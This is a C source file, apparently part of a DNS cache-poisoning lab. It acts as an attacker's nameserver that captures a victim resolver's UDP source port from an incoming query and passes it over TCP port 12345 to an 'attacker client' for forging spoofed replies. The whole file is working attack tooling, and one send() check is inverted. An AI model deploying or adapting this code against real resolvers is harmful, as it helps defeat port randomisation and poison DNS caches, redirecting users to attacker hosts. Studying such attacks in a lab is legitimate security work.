#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define DNS_UDP_PORT 53


int main(void) {

    int udp_sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (udp_sockfd < 0) {
        printf("udp socket failed");
        exit(1);
    }

    struct sockaddr_in udp_addr = {0};
    udp_addr.sin_family = AF_INET;
    udp_addr.sin_port = htons(DNS_UDP_PORT);
    udp_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(udp_sockfd, (struct sockaddr*)&udp_addr, sizeof(udp_addr)) < 0) {
        printf("udp bind failed");
        close(udp_sockfd);
        exit(1);
    }

    printf("[NS] waiting for DNS query from resolver..\n");

    char buf[1500] = {0};
    struct sockaddr_in resolver_addr = {0};
    socklen_t resolver_len = sizeof(resolver_addr);

    ssize_t n = recvfrom(udp_sockfd, buf, sizeof(buf), 0, (struct sockaddr*)&resolver_addr, &resolver_len);
    if (n < 0) {
        printf("recvfrom failed");
        close(udp_sockfd);
        exit(1);
    }

    int resolver_port = ntohs(resolver_addr.sin_port);
    printf("[NS] Got DNS query from resolver port: %d\n", resolver_port);
    // here we got the Port number



    // this is the socket in which we use to send the port to the attacker client
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
        printf("setsockopt(SO_REUSEADDR) failed\n");
        close(sockfd);
        exit(1);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt))) {
        printf("setsockopt(SO_REUSEPORT) failed...\n");
        close(sockfd);
        exit(1);
    }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(12345);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        printf("tcp bind failed..");
        close(sockfd);
        close(udp_sockfd);
        exit(1);
    }
    if (listen(sockfd, 1) < 0) {
        printf("listen failed");
        close(sockfd);
        close(udp_sockfd);
        exit(1);
    }

    printf("[NS] Waiting for attacker client TCP connection...\n");

    int conn = accept(sockfd, NULL, NULL);
    if (conn < 0) {
        printf("accepting failed..");
        close(sockfd);
        close(udp_sockfd);
        exit(1);
    }

    printf("[NS] Sending resolver port %d to attacker client..\n", resolver_port);

    if (send(conn, &resolver_port, sizeof(int), 0)) {
        printf("send resolver_port");
    }

    close(conn);
    close(sockfd);
    close(udp_sockfd);

    return 0;
}